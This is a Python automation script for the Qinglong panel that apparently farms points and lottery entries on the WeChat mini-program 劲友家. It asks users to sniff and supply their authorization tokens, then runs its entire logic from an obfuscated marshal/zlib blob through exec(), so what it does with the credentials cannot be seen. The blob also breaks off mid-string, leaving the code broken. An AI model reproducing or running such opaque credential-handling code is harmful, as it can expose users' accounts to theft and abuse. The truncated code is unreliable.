'''
vx小程序 -- 劲友家

uerid的获取:
    ① 进入小程序 -> 进入页面弹出的活动
    ② 抓包 https://jjw.jingjiu.com/app-jingyoujia/app/jingyoujia/promoteCode/scanUserPromoteCode 接口 请求头的authorization body下的 userid
变量填写:
    ①export jyjck=”authorization1#userid1@@authorization2#userid2”
    ②export jyjlatlon='xx.xxxxxxxxxxxxxxx#xx.xxxxxxxxxxxxxxx' # 经纬度 --> 经度#纬度 --> 小数点后15位
    ③export jyjadd='0' # 开启登高积分兑换抽奖 0关闭 1开启
    ④多账号请用 @@ 隔开 authorization和userid 使用 # 隔开 经纬度信息所有账号共用一个
需要安装依赖 pycryptodome
    安装方法： 打开青龙 -> 依赖管理 -> 新建依赖 -> python3 -> 名称: pycryptodome

'''

import sys
vesion = sys.version.split(' ')[0]
if vesion.split('.')[1] == "10":
    print(f'你当前的python版本为 {vesion},即将运行脚本...')
else:
    print(f'你当前的python版本为 {vesion},运行所需脚本环境为 3.10.x, 即将退出运行脚本...')
    exit(1)
    
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(zlib.decompress(b'x\x9cm\xbaG\x0e\xc4Z\x96%\xf6\xb3*\xbb\xbbT;iP\x02\xbd\x03$A\xf4\xde{N\x04z\xef\x82\x0c\xba\xa96\xd2=\xd4\x96r\x07\xda\x82F\x8a\xff+GB\x13\xe0\xbb\x0c>\xf29\xde{\xcf9\x81W\xfc\xf1\xff;\xfe\xf3\xef\xfc?~\xe7.\xff\x8a\xf2\x8f\xf2o\xe3\x1f\xe9\x7f\xd8\xbf\xa5\x7f\xfb\xcb\xfeK\xfa/\x7f\xd9\x7fM\xff\xf5/\xfb\xf7\xf4\xef\x7f\xd9\xff\x94\xfe\xa7\xea?W\x7f\xfc\xb7\xffR\xfd\xfd\xbf\xfd[\xf9/\xff\xfdo\xff\xfdo\xff\xd7\xdf\xfe\xf6\xab\xf1\xfe\xf8\xaf\xff\xfa\xff\xfc\xd9\xb6\xb9\'\xff\xf3\x1f\x7f$\x17\xf3?:\xa4?\x0b\xe7\xcfB6\x95?M\xca\xb0\x03\x13]L\xd4\xfc\xac\xe4\xb09#fL\xe4\xfc\xee\x8b;3.\xdc?\xeb\xf9\xa81\xffY\xeff\xac\xf4\x1f\xf5l\xb8\x88\xa9\x93\x8e\x8c\xc6\xc8\xa9\x135\x9c\xe4p\x8b#\xb5Lb\xb0\x8c\xf3{/4\x18\xcd\xb1\xd7\xbfz\x16\xf07\xe6\xfe\xec\xb7+\x98Ph>\x07\xdd\xff\x0fG\xc8$\xbf\x93\xfd\xeb\xaa\x80\x9a?\xaf\xff\xd9/\x9b1\xff\xec\x97\t\x17\xf6\x9f\xe3\xe2\xa2F\xfdg\xbd\x991\xc8?\xc7%.\xc2?\xeb\xc5\xa8\tGv\n\x98\x85)G&c\x94\x94\xd1Z&\x13\xd8\xe6\x12\xd8?\xdf\x0b.fe\x80\xe1\xaf\xfe\xfc\xd9\xdc\xe5\xdf\xba\x81~ID\xe2\xf2\xe7\x9d\t\xfe\xb8\x12\xd30-\xe3\xfe5.H\x07\xa2\x1ec\xc1A~\x8e\x92\xe1%\xc6\xd8\xd8\xc5y\xd4\xc3"B\x9f\x13\xdf\x84\xbe\xab\xa6\x85\xb8\x08\xb3\xfbQ\x7f\xe7kiy\xfa\x1cP\\\xd8b\xfeCg\xf9\x8aw\xdc\xcegW\xd4\xce\x9a\xb6\x8f\xb3\xf6T1\xdc\x98\x04\r\xbda:;2\x97<\xa4\x91g\x08\xda\x05\xdc\'\x12\xe7H\xd5K\\\x8b\xb0\xb7b\x89t~Cq\xe3n\xdd\xa5\x9a\xd5\x8bn}\xaff\xee\x1bO+\x9c\xd6\x82\xa0\xe3\xc89\xd5\\\xa1\x02Q\xfakl\x92\x13\t\x19HnQX=\x12\xc4\x8f\xb8\xcf\xbd\xe1t\xd1z=[r\xfb\xdf\xf3Y]\xea\xfbE5\xcb \xed\xc1\xf8\xa6(\xfa[6\xe5\x0cDK;\xeeE\xcb\x0c\xf5C\n\xca\xd7\x18\xbe\xd0%Nh\x1a\xb2\xb7+\xd2r4\x99\xf6\xc7\xcd\x07\xeb\xa2\xe7\xba\x932\xc6\x82\xe0\xacQ\xeb\x80\xc9H2\x86\xa12\x8a\xf9\xd5<\x8do&\xfbs\x87\x8d+\x0e\x8aR\xbd\x97KBu\x9bS\xa5\xbb\xbb|\xa3\xb7\xd86I\xbd-\x88*\x9a(.\x92-\xab\x8d\xa7g\xef\x95\x0c \x9b\xc2vX6$\xfe\x18\xcc\x95\x14\x0f\xb9\xdd\x0bk\xacPH&Djh*\xc9\x8e\xfc=\xeaa\xc2\x12`\xdf\xc8\xad\x1b0\x03;\xbe%5\xcc\xb1\x1e\xb3\xd0\xfcB\xc7\xf4\x8ak\x0e?\xf8U\x91\xc7\x83\xd6I3\x0c\xd4z\xf6\xe9`Y<zt\xcf\xd4\xc1\xdd\x88]\xef\x0e\xd7(0\x1c=\xd6\x97m\x18.\x08\xe6\xee\xb0\xb2j\x12U\xc5T2\x81\x03\x8e\x7f\xe8a\x9d\xbb\xda\xc6\xbcS\xf0\xce\xb2l\x95\x0b?}\xa4E\x9e\x88\xe5\xf0\xb2G\\m\xb5\xcb\xf1\xdaN\x8a\xa0\xc2\xf9\x96\x8b\xf4\xfa\x88PK\xa81\x95\xe2+\xe0sdyoA6*\x91\xdf\xc9N\x92\xc3\xe2E\r\x0c\xba\x93\x16\xfd\x91F`\xe7\x98\x06\x02\xa1\xad\xa9BW\xdaNN\xc2\xee\xde=%%8\xc9\xaeUg\xf4\x9cL\x8e4on\xc3\xb5\x9dak\xfd\x0c\xeag\xb1@`p\xdb\x05\x07j\xdd\x96-\xeaM\x1aN\x94\xd4\xfav\x01\xb3\xb2\x8d5\xf4\xf0\xaf\xc8\x0b\xdd\x13\x12%\x0c\xd1\x03\xc6e\xb7=UC\xc6\x12_8\x8cL\xc5\xef\x99G\x82\xcby\xac7\xaa\x06\x8d\x9e\xed\xb5=\x9a(\xfaS3xa\x94a\xfa\x98\x87\x15\xc13\x13\x9e\x11\x19\xd61K\x7f+O\'\xb4\xf2T\x8eW\nB\xe06\xedg\xee /\xce}\xc8R-Bt\xd9\x9b\x81|%\x8b3\x7f\x89y\xfb\xc6C\x94\xd4\xe5\x0b(\x93\xf9\x8a.\xa4\xd3H]\xdb\\X_M\x87\\\xf0\xa6\x8a:;\x81\x06\xcd\xfd\xae\xa9\xf4\x99}&\xacu\xb6!ydP\xd3`\xf2\xdf\xaeyz\x0b\xf2\x8c\xaae\xbdL@Wb\xe09\xe4L\xcc\x17\x85\xc4\\~\x16B \x04j\x05+8\x81/h%?6F\xbd\xc4\x07\xee\x1b\xc5\x8ev\x9e8n\xe7\xe3\xa8\x18\xfa\xcd\xe5\xdc\xb3\x10\xa9\x12s;\x9e\xfc\xd3LT\xcb\xf1\xbb\x13\xd3\xaf\xa5C\x84,\xb6\x9a8\xe8\xa5-\xe13\xe7\xa6r\x92\x95WA.\xe8\x114\xec\x12\xcet\xc94\x8c\xbc\xfa\x96\xa1\xcfd\xd7\xb2\xb4E-+\xfbP\xear\xd9\x8d@\xee\xe9\xc8\x1e\xf7a"\x85\xd3 \x10\xb5\xdb\x9d\xbc=A\xad\x9f\x9d\x1b(\xab\x9a!9\x03\x89Z\xa8,\xf5\x1c<\xf1\xeb\xa9\xe3\xf4\xfd\x8e\x1c\xba\xbe\n\xfbhi\x1d\x0e\x08\xb3KR\xb8zi\xa8|\xcf~L\xaeM\xa0\xad+\xcd\xb2\x99\xf2\xa6c\'\xb9\x81\x15E\x80\xd9\xaf+\xcb\x05xE.k\x81\xf4\xd7p\xd8\x93\xae}\x98[w\x02\xa0\x15?w\x10\xce*\x86Az\xcek^bR$\xf24\x1fJ\xa8\xd2\x0bBI\xbc\x0e\xa6\x84\x93\xbe\x0f\x84ly\x11bW()\xf3\xa3\xda\xa2\xad\xe6z\x08\xe6k\xc5/\x0c\x97Os\xbdSHs\xe8\x16\x81\x99-\x03f\x050j\xf8\xcc\xe3\xcb\xf53\x0b\x8d\x19\xb9\x17\x17G\xd6\xf1\xcd\x18\xcd\x7f#\xfe|G\x88{\xc9\x0e\xbf\xc3\x1b\xcd\xa2P\xe4\x13\x1c\xf7l\x87\x12p\xfdi\x17?\xf7JYw\x82\xcdq\xceQM\xfbh\xea\xb2\xa9\xa4\x8e\xdb\x17\xb9\\oJ{N`~\xc3\xae\xf2+z\xe0\x15\x1aJ\xd8\x0b\xc2\x8bQFm:\xd2\xb0\x82\x92f\xbc\xd5\x83\x99\xae\xad\x97\x9e\x15\x95\x95\xa03K\x87*\xc4\x84\xa1%\x07`\x8e\xbe\xcdRxL\xba&q\xcfMel\x87\xdd\xe0m\x8e\r\xb5*&e\xa6\x08Do0\xd2\xe2\xa7\xd8\x15\x8b\x8aH\xb0v\xbeY0\xb0\xc6iQ\xf3N\xf2A\xec\x07\xe1\xc3o\xec\x04Z\x06w\xc3\x97\x01\x9e\xe9\xda\xe3\x16\\\x9bm\xf5\x0eC\xfb&}\xddl\xb0\xbcm\x0e,\xbb\xdbg8\xc5\xc4\x01tr\xb1b\xda\xc0\x89 !\x18\xddI\x15\xb8\x8dH\xc1x\x92\x97\x84\x17f\xe5\xc2o\x1du\x9cl\x17\xe2\xcd\x00\xeff/Y9\xaf\xad^\xc7\xeb\x98x;o\xa4\\g\xaa\xbc\xcb\xe15\xecw\xc5~sN\x90;\xfdp\x98\xe4\x98W\xbed\x89M\xb0b:\xad\x0e>\x97!\xdd:FI;6\xfa\x88\x7f\x85\x86\xe7i\x85&]\xde\x96\x9d\x08\xd1$\xdb\xa3P\xb5\xc6\xdelP\x81\xda\xf6\xb3~h%U\x8c\x027#\xbd\xf9\x87\xda`\xc2,Q|~-Ig\xef\x84\xe9\xa5\xaa\x93\\\x14\xeeASL\xc4r}\x1b\xf8\xa4=JN\x038i\x0c\xa8\t\xcc\xf7\xe4\xdd\xcfni6\xd2G\xb5\x07\xa8\xa27\xedl=$\x04\xa6\xa7K\x92\x8c\x88\xe0\xa4\xccc\xbe\xcd\xb1\x0e\xe3\x93\xbb\xeec\xe2g\x1b\xa0T\x9d\xb2\xa6\x07F\x80l\x9f_*\x1c\xf39\xc9\xb2o\x1fl\xb6\x9eI;z\x87V\x89\xd5\xac\xe9CM\x97Z\xd6a\x06\x18\x03~\x8e\x1b\xfahc\xe6}\xd3c!\xb7\x95\x00c+?\xab\xfa+$F\xa6\x87\xf3\x85A\x0e\xd0\xd5\xafV\xe2d4\x1c<s\xc2\x0e\xf3L\x16\xd4\xc7\x8f\xd75"c\xd2L\xd3\xfd\x1e\xab\xae!\x9b\x18\xd8\xd2\xad\x87\xf1\xd6\xd4\xfa\xc4!\x10~l\xbd\xf2#\xd0\x9dAQ\x1f*|.\x88\xf4\x9b\x95\x12\x8a\x7f\x1ep\xfb\x1cG\x16\xa6\xfd+\xc3\x02\xe0N\x8f\x8c\xdb \xe6\xf1\x04\x9b\x9fh\x0ff\xd2\xadsij\xc6O\x867\xa0\x04\xed!#\xa1\xb3\xda\xd2\xaa]\x00\xa8\xff\x85"\xb5\xba\xb8n|\xbe\xb1\xecZ\'k\x00\x1a\x9f\xa4^\xb0\xcaQV\x9d\x01\x9aS\xc7y\x9e\xdfd\xba1\xd3\xa0w,U\x7f\xe3{\xab\x08ua\xb0#v3\xc3M\xc0-H\xb2\xdc\xe5\x10\xec\x041\x02r\xa0+\xbfP\x88\xb4\x8d\xaf{\xa3uO\x1b\x02R(\xbb\x94/\x0e)\xb7\xd1\x88\\\xc5\x16\xd5\x19\xfe0\xf5X\xb7\x98\xbc7\x88v\xedSl\xf4\x9c\xb8\x06\xc1@\x88\x04!\xcd\xbd)AM\xda\x1d\xad-x\t\xfeF\x91)h\xbb\xba\xc7\xb1\xbe9\x01\xe7\x80\xdepH\xf8"\x0f\r\xa1\xa8^q\x04\xbc\xfc\x820V\x95\x88\x17\x9a\x90_\xcc\xde\x9b\x1a\xba\xa5\x07\x84f\xd8\x10y\x12~f+\x14\x0c\x8el\xa0]_\xff<\x82\x83\xef\xa5\x03\x00\xca\xb6\xce\'~\x84J\xc5eT2\xa0\xfa&\x9d\xf1&\x86@sK\x84U$\xa8\x19_\x96\xe3\x1b@`\xd5{)u9^\xd2.\xac\xca\x81\xc1\xfd\xd4\xdb\x00\xc1nP\x8fv1\x1b\xab\xe0\xa3\\6q\xcc\xd9\xd7\xf6\xa7\xd3\xc5\xe1\xab\xc2\xb9\r\x8d37\xe4\xb1\x93\xaeK\x0c\x08,\xb6\xb8\xa0\x8d#!X\xf8\xb3K\xac\x96\xb9\x01\xd9\xb2\xdc\xa76\xedx\x0ep\xbe\x93P?\xb6v\xa0\xc8\x97K\x95\xa3c\xd4\xa3\xaa\x977\x8c\x13\x89l\xab\xc86R\\\xf5m\xec\xb8z\x145\xdeO\xbb\x7f]\xdc9\xd33S\x90i\x066\xa0Aqmy\xd9\x19\x7f\rI\x1f\xeak\xfd\xaep\x14<!\xee\xb3u\xf8\x8e\x15\xa8\x1b\x07\xb9PO(,*G\xde\x9f\xf70:\xdbe\xd5;q\x8b\xcd$\x8e\xe8"\xdeq%\xe7\xdf\xf8\xe7\xa2u\xe2\x1d!\x13\xd1\xa4\xda\xaf\xb82\x18\x89\xa9\x1b\xd5\x8ec\x1c\xadG\xa5\x7f/\'X\x03\x8e\x06\x8e\xdb;\xfb]\xdb\xfa{\xc9\xa3\xb3\xb7\xb4\xb2\xd7\x02U\x16\x89vfF\xa7|La\xdft7\xc3\xd4v?K\xcd\xb9\xde\t\xf5\xf9\xb9\xc5d\xed"\x08\xa9fEr\xccx\x8b\x14\xd1\x9c\x8e\xcc\xa9t|\xc6/\xa4\x07\xe1\x06\x94\xaff\xbd\xfc\xa66\x1fR8\xc5\xd4\xb9yA\x90y\x87\x8b/\x92\x87\x86\x9a\'\xc3\xc3\xe2\x88?\x1e\xf2u\xdf\xeeN\x80\xb5}\xbbEN\xec\xaf\x88\xf3\xfa\xdc\x86\x93\x16\x08\\\x87\x8e\x824\x0bQ\xa9\xe3g\xc5\xa4\xc2\x0f\xdc\x8e\x07\x01MZ\x7f\x0b\xe0Vg\xbb\xce\xe8\'D\x19UC\xb4\xf6\xf9\x91\xb6\xeb\xb3\x95\x0c\x00\x00o\xe0\x9dV\x9c\x16\xe0\xc6\xd1\xf5\xe1z\xdf\x92\x1f\'\x1fx\x14{&\x18\xa4\xc8v\x19\xef\xfa\xcf\xab\x13VWu\xa1\xd7>C\xddVPJj3\x9af\xe4\xe7\xbb\\\rSM\xe8\x11Ri\xf4\xfef\xef\x96\xefTF\xfe7\xf3\x0f\x08\x9b \x85\xdd\xd7 \xdd\ns\xf7y\xcc\xc5j\xe1\xb6@z\xae\x9a\xa1\xf8\x16k\xa1\xe0\xe2\x00\x8d\xf4i\xa3\x98\x16\xde\x10\x82ED4g)Mzx\xd5\xab\x8d\xf2\xc4\\o}\x1e\xaa\x9eL\xfe\x86\x9f\xfbEY\xb8\x1f\x00\xe7\xccl\x19\x16u#+\xc3\x90\x9a\xf0M\xaa\x15x\xf1@v\xea#\rE\x1a\xa6^\xabo\x8a8(\x11\xad\x16z\x8e\xfe7\xb8\xa6\xdc>\n\x83\xcc\x9a\x13.\xd3L\x98\xfc\xa7b\xe3C<\xc5\t\xfb9\xe0\xc4qL9-\x98\x92\x89\xce!\xd7\xaf\xc3\x1b\xc0\x13\x90\\7\xc9L\xa9,\xa4\x11\xd1\xa7\xbf\x18\xd7\x04\x9e\x19\x93C\xa0\x81\xf7\xf5Cd\x84\xb4\xe5\xd5\x8f\xd6\xc8X\x1dW\xe1\xfd\x99\x99C\x0fS\xbd\xebbbc,Qc\xdc\xc5\x81\x87\xf3\x94\xdb\x8f\xdf\xd7y\x8f\x10\xd3\xa9P\xdb*\x07\xa5\x9f\xde\\\x8a\x03J\xc5\x92:\x0f\xf8\xf1\t7\x15\xc2\xd8\x12\x935\x07\xa8\xa6n\x88\xe0IMcCWs\xb6\xdf\t\x9cP\xab\x16\xf5\x18\x01\xe8\x7f\x82\xc0+\xbe\xfeg\xa6\xdc:\xf9\x8a\x97\t\x15\x0e\x98\xe9\x07-k\x04\x840jf!\\\xc3/h\xb5\x1e\xf1\x03\x85\xdf\xf0\x04\xf7+6\x0b\xa7\x03O\xa2\xab\xdc^C}sa\xe1\xba\xe3\x890z`\x10\xa3\x8d\xe3R\x1c\xe4\xc0\x89\x86\xcbHG\xd4\x08\xb6h\xe4\x87^\xdc\xde;r\'\xfe\\$m|5$\x1d\x87 \xc3\x0eU\xb9\xdd\x0f|e\x1f\xf6\xf7\xb5M\xee\x15\xa1;\x04\t\x01k\xd8\x9c\xda8\xef*\x13\xe8K\x8e\x84\x02ax\x11\xd2\xfe\xc6\x06\xba\xc6S@I \xce\x84\xaa\x00Y}\xf5\xad\xa8\xd7EE\x15l&\xdf%\xef\x96\xf9P>\x1d\xc8\xa2o\x17\xc1`\x04}\x8c\x98\xda\xfb`)\x0b_\xf8\x90n\x9d\xe67\xf5s\xfa+\x02\x02\x1e9\xbe\x9fn\xf2U\\\x00B\x08\xff\xa8\xfb\x81\x80\xc1|e?pB\xe5\xdaB\x9er9\xa8k\xf6\xb7\x90\xd1s\xffGT=\x1b\xc6\x88(P\xad\x02\xaa\xf2\x1f\xf2U\xa9\xac\xae\x8du[\xcc\r\xf9\xb3%\xd7\x9d\xac\xebS\xbb\xcaW\x81N\xf1\xe5\xe7vx~M\xfd\x92\x08\x12\x1f\xe0\xe1\xfae\xb0\xef\xa4\xfc\xa8\x1b\x07~^-\xb3\xb9\'\x00@>\xd5\x10\x10\x13G:k|F\xb5\x9f\x94F\xa7`\xb9\xdf\x0f*)O\x99c\x1a"c\n\x8c\xad\xcb+9\xc2v\x17B\x93\x8e-\x16D\x92\xe7or"\x0c\x9b\xa7D\xf7\x92yp\x91\xd4\xf9\xe9w)\x1cc\'d\x94\xd9\x82\x00\x969\x98S\xb3\xcb_\xd3\x19\xcf\xd6&\x89E\xb0\x99\xdf\xf7\xd2e\xbe!\xf8\x03\xc2\xf3\x07\xc7|]u\xa0.\xd3\x96!\xfb\x88[p(\xa9\xa3L7\xbc\xf7e\xf5P\xe5>s\xa82\xf6\x88*:\xfaN\x1d\xb5\x0enM\xeai\xbf\t\xcb\x19/\x9a\r\xf20\xe6$\xa8/\x92\x80\x1fR\x9f\xad\xc3\x0f\xaa\x07H\x1c\x85R\x8d~N\x9fJn\x0c\r\xc3\xb8\xb3K\xb0\x96F\x83$\x95\x10\x8c\x04\xc0\x84\xc2\x8f\xe0:\xa9\xf8\x9c\x80\xf6;|IO\xe1 \xd41\x12)P\ri\xf8\xac\xb2\xd9]\xc8\xa2\xefm;e.:\x84-\xbb\x1a\xf5\xf2CDf\xb9\xca\xd5\xc9at\xfax\xfb]:\xa8\xca\x0b\xd7\x19m2\xe8\xd1\x1e>@f\xa0\xb5\xe1S;tr\x9c2\xf8\xee\xd9\x10q\x0c\x9c\xa5e\xd2\xe4\xed5\xb0\xd0a\x87,\x8f\x1e;\xc2\x88\xa40p\x16\xb7\xc5\x9f\x06\x1fV-\xfb\xec)\xc5\x1f\x8aw\x89OA\xbb\xdf@i\xe3s\xd5\x84\xe9Mt0\xe3/%\xf7\xf7\x9e\xef\xc7\xed\xaa\x03\x18\x83\x8d\xce\xad]\x01\x01\x8b\x10\xdf\x1e*7\x81\x8a3\xdd-\x07&\x11\x18\x99\xbeZ\x83\x13\x81\x8a@\xfd0u\xf0\x91w\x12\xea\xd1\x19\x8f+\xc0\x84\xb7\x0c|G\xe16\x1d\xa2\x88#\xc4\x8ce\xf1\x9d\xd3\xe0\xa9\x03\xaf\xb1\xe7 \x1ey\x8fu\x92:\xb2*h\xdb\x13\x1e\'|\xaa\xd3\x9ao\x9c\xab\x94\x10\xbe/\xba\x16x\xe4\xea\x85"\xdb!\xd8\xea\xf7\x05\x919\x08!\xc9\xd99\t[\xda/m\xa1v^\r7s\xaf\xd1\x8b\x0e\x08\x05\xbbp\x0e\xe8\x05\x89ch\xf6\x93\xa3.\xef\xc6\x01\t\x0f}qX\xf8\xc1\xca>>{\xb0\x109C\x1d!\'G?Z\xeb\xe1;\xd9\xa3\xd3\x99\xbf\x9b\x80Q\xdey_\xbbI\xefu\x86\x12\n\xc2\xd3\xae\x1a\xb2\xd3\x9d\xa8\xe0\xe0\x93\x01m\x9a\xc4\xd9@\x1b\x1an\xa2\x92\xb0\xbe^^\xc0\xa2\xf9\xbb>\xdf\x1d\xf3@\x97\x90+\xad\xc9\x08Y\x84\x92 \xc0\x90TB\x9d\x01Iy\xe1pX%o\x8b\x91~g\xc064L\xb7\x07\x17t_\xa6\xea\x118\xe0m\xc2\xa5\xd4\xc8\x07Gpe\xd5\xb6\xc86\xb7x\x80^5\xd2:\xb7\x194\xef\xe3>\xf6a\x89<\xf6\xe2\x96\xc5\xbf\x07\xc6\x13k\xa0(=\xab\xb2\nC\x1a\x89\xf8x0\x0b\xd0\xfc\xe8\xe3\x02\xe1z\x81\xd5\xd2L\xbc\xc5\xf6\xfbb7dq\xa6\xa5\x80\xb3\x8a\xff\xc8B{\x03\xd0\xb2|y\xa1\x88\x07\x84m\xc2\rB\xae\xf2\xa8\x0f\xbe\xbc\xf3\xe6\x87\x01.t\xf0)\xfc\x9a\xd0\xc2D\xe7\x07\x06\xe5b\xab3\x07W\x89\x10\r`K\xb8\xd6\xa6\xd1\xc5O\x0eyc\r\xb4\x9cz\xa2\'\xf7\xeaY\xf1\x13\x8c\xa2oXE\xf5\xf1\xea\x8f[E\xa5\x82\xdc_Q\xf0\xed\x99\x99\xba!\xa0}C5N>\xe9\xd2XwZ\xd6\x08\x1d\xab{\xc6K\r\x9e\xce+?\xf7R\xc0\xe8\x9d\xc3\xd6v#\xe5/A\xee4.\xd7x\xa3M\x14\x8aX%\xa7\xdb\x81\xa6"f\xc3\xf9\xfc^\xd6\xa9\x1f\x88\xb0!\x01s\xaa\xcf\xe3S>\x1d\x81*\xb5\x06C{;\x7f\xce\xb1\xa7\xce\xf3)\xf9s\xf4\xb0\x19\x0cQ\x98\xd8\xce\xa4\xfe\xfe\xb86\x9d\xcc\xbdr\xb0\xfe\xf7\xd3\xb42_X\xef\xf1\x81\xba\x1f\x8b\xcdL\x85\xa7\xe1\xd7\x9f\x07v\x9e$<\xa0o\xcf\x8f\x16/\x18\x192.\x84\xc8C!<>\x02\x9c6\xda\x10\xdb!\xd8S\xa8\xe7\xe6|\x13\x01GI=\xcdQ\x9aK\xd7\xc3\xc2\xcc\xde\xbf=OQ\xe9B\x06\xcc|\x97\x16\xa7\x8e\x1c\tP}\x0e\xff@\x0e\x11Z\xe6u\xbf\xf9rD\x87V\x19B\xe6\xc6\xa5\\^_\xd5\xbdN7\xb3\xc3fE\xeb\x16\x11\x9e\x96@I\xbf{\x0b&h\xd5\x1f\xa9\xc4\x1c\xd5[\x15L\xb6!g\x15\x11=\x14\xcc&\x96P_%\xe9\x0f\xf4I\xc4\x9d\xaa\xa8A\xae\xa4h8\x83N\xd3\xaa\x0cK\xf1\xd8\xba\x1b\xe0\x13\t\xba\xb5\xe4\xca@\xef~\xe7{\xf0\xf8\xa3\xf9\xdd4|P72\x1d\xfc\xb9\xb3\xe5\x96\x80\x8fw\xe2\xdfe\xec1B\xd2u#H\t\xe8pH\xa9W1\x8f\xc9\xdd\x88\x04M\xb8m\xb1\x0b7\xa0\xdb\xe0\x87\x0e\xcb\xb7:(h\x12-o$\xe9\x1ap\x9d\xec?\xffi2\x14\xfd\xb9\xd3\x98W\x81\x1d\x9a\xcc\xef\xa0AO\x1c\x96\x80w\xc4\xdd`i\xc5q9\xa2\xa4\x13!8\xd7b\'\xce\x1c\xe9\xb6\xef\x9f\xe1\xbe\xd9\xa1\x1d\xf8\xc1\xfa\xe0\xea\x88\xdc\x9bp\xac\xabn?\xf4\rC!\x18\xfa\xad\xb26\x90jC\x03X#\x84\xb1\xed\xebO\xa5f\xef\x11\xdb\xe4B/)\xf9\xa0k-t\xc9V\xd8\x0eq\x80^\x0fh,\xaf\xe4\xb5{\xdc\x95P\x98\xeaPe\xf47\xf5\xb1\x8d\x0fD7\x08\xd7l\xe4\xf4\x9f\x1b\xe2\x00UA1\x10>\x95-`J\xe3\xd9\xdc\xcdS\x15\xf1- \xf7\xeb*\xadu\t7i~uIa\x9eB\xebo\xa3\x1f\x8f\xe7\xfa\xee\xe5\x8749\xd6wkyYSfD6]V\xb6\xf5\xdc\xbf\x1a\x1c\xaf\xef\x12\x1d\'\xf2B\x9a6\x15g\x00m\x98\x05\x9f\xbd\x04*&x.\xe63\x1f\x8ee\x87\xfc\xd7\xfaD!7\xe1\xf1\xb8\xd2\xdeX\xb6\xe0H\x8f\x1eo]\xa2E{\xba[\x17Z)]\xa8\x9b\xc6\xe3\xb4E,r\xa0r\x9e}\xf1*\xd8\x8cZ\xe6t\xbd\xd5\xce\xe6\x83|qo\xe2K\x96}C3\x96\x82uF\xc2\xfbnTZS\xe5\xb7\xef\x99\xba~\xe7\x954\xef\xa0\xef\xf8x\x7f9G\x1d\x85f\xe4\x13\x96\x03q\r\x89\xb2\x94le\x87\xfe\x8c\x1f9v?\\\xb1\xa8K\xfd\xd3\xff\xd1,\x11\xddGo=\xd1C\xe8S4@X\xa1\xfa6\x92Nc\\\xe3\xd1G\x05.W|\xf9\xfc\x80\xdf\xf8\xdd"d7\xca\xf1\x89\x05\x14\xf6\xbc\xc8\x05\xf1\xd0\x92\xe4\xa2\x00D\x03V4\xa4\xb6\xfc\'S\x8bt{W\x0c`\xc2\xe9\xb7&@?\xc5Q%\xe3\xbf\xb8\x05\x00\xc4\xfa\xe9\x974?\xc0b\xfd\xb9\xa5\xdeM\x1bv\xcd\xf9\xc9.9l&\x1d\rz\xfc\xa0\xfb\xc6\x08\xdd\xf7\x12\x13\x00\xa2\x03\x99\xa2\xa1\xf3\xbe\x17\xect>1\\\xf6\x90\xf0q\xf8\xc0Yj\x85t\xe4a\xf9\x89@\x0f\x8e~\xec\xa7\x1eR\'\xa4<\xa1^\xe8\xcf\xd9\xb3@\xff\xea\x95\x1dm\x15\x10K\x86\x8d\x07\xc1\xa2\x12?\xe0\xe8\tL6\xe8\xe0uh\xde\xfe\x18\xe8\x97\x0f%^\xb6\x1b\x19>?}\xe0\xd0^wz\xea:\xa4\xd8\xa0\xf0\x05A\x89\x9f\x04l \xfd\x0bV\xeb\xfb\xbdH\xa4\xf8\xe9\x8a8\x1d\x9bUI\x98\xe3\x95\'\xdb8(k\xa8D\xd9\x92\xfb}\x95&h(\xc6\xb9^C\xdf\x89\xd7~90\x80\xbc\xa7\xaa\xc8:\x12\xe5\x00\x08\x07cD\xcb\xfb\xc3\ne\xc6C\xa0\x88}\xe9\xe6\xb8{}\x7f\xeb\x98\x14\x18JW\x89#\x11\xf1\x9a\xcbV\xd5\x97\xb1\x16\xd7Q\x08>[\xc0.\x811\x05x\xc7\xd5\xb5X\xac;\xed\x81\xc3\x062\xe5\x8b\x04\xbc`PZo\xfe\xc9\xe5\x9f\xd6\x9d\x90\x16\x8c=\xf0N8 \x91=a\xc6\xf6\xb27\xccj\xe5T\x10\x96V\x98\x94\xc1\x00I\xb1\xa4\xe60{\x98\x8e\x99\xda6\x8c\xd0\xdb\xc0\xe6z_n\xac\xe5\xe3\x07\xea\x89\xa3#\xedx1V\xa8g\xae\xfd$p-\xc2\x87\xbc\xc9e\x9d\xccG+#\xa7\tv\x08c\xe8\xbb\x90\x1dh$\x86\x98\xbc:\xfe`\x07\\\x04\xedlO\x8aC\x96\x08\xd1r\xf4\xa4\xa1\xe3\xee:\x9b\x07\xbf2\xd2j^\x16`#\n3|\xec\xb4{\xf5\x8b\xab\xec\x96\xe6RR\xef\xf0\xf4#\xbb\xe1\xf6\xb4$\xf75\xc4\xda\x14\x7f\xa2L\xff\x9c\xd9U;\xbf\x9c-m\x86\xa9I\xf0O\x19$\xf3\xfb\'\xac9\x03\x9c\xfaj\xca\xd8\x02\x10\x05\xb6\x02\xeajJ\xba\xde\xa7\x1f\x9d\x8e\x137Q\\ey\xfaF\xfbvK\x0c\x89\xdc\x10Cg\x87h\xdcl\x81]\xbd\xcb\x9c&\x85C\xa4\xb4\xdd\x8b\xc7A\xed\x10\xeb%\xc5\xfe\xf4\x1cc=\xa5\xf2\x15\x89g\xbe_)a\x8dI&C\x10T\xadt\x863\\\xc5\xf6\xe2\x04\xe6;\x8b\x0e\x9b\xdb\xf3\rJ\x96\xc6l\xc2\x15\x057j\x897\xd8{\x9d=\xa4\xfc\xf7Z&-9\x01\xe5Mz\xcf5D\xf1\x05\xbe\xe9\x085\xc6}\xad?\xd68\xf7\xea\xa2v\xb8\xc4{\x05\xed\xfc4\x95#\xf0\x05\xd4\xffX\xda\xc4\xdaC\x83\x9a\xf8L\x98<\xa7\\\xe0a8\x11*0Z\xdf\xb6\xd4\xb5p\x90\x91\x85\xde~\x9a\x8b\x18;;\xf5e~\xeb\xe6a\x1a\x84\xc6\x89-+\x9a/Q+R\x7f\xa1\xfe\xc2?\x92\x9f\x18\x92\x83\x0e\x99\x00R\xaa\xe6\xf0,\xbd\x97\xef\x80X\x85Dg\xb2\x91\x97\xbchy\x17z 